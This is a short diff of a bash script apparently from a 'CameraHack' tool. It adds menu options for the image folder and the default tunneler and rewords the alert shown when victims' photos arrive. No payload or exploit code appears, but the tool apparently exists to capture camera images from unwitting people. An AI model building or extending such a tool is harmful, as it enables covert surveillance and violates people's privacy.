@@ -380,6 +380,12 @@ sleep 1
 
 bash OnlineHacking/logo2.sh
 
+${cyan}[${white}i${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+
 sleep 1
 printf "${cyan}\nCamera${nc}@${cyan}Hack ${red}$ ${nc}"
 read option
@@ -547,10 +553,10 @@ while true; do
     fi
     sleep 0.5
     if [[ -e "log.txt" ]]; then
-        echo -e "\007${success}echo '
+        echo -e "\007${success}Image downloaded! Check directory!
      ---------------------------   
     !    PHOTOS FILE RECEIVED   ! 
-     ---------------------------   ' | lolcat
+     ---------------------------   \n" | lolcat
         file=`ls | grep png`
         mv -f $file $FOL
         rm -rf log.txt
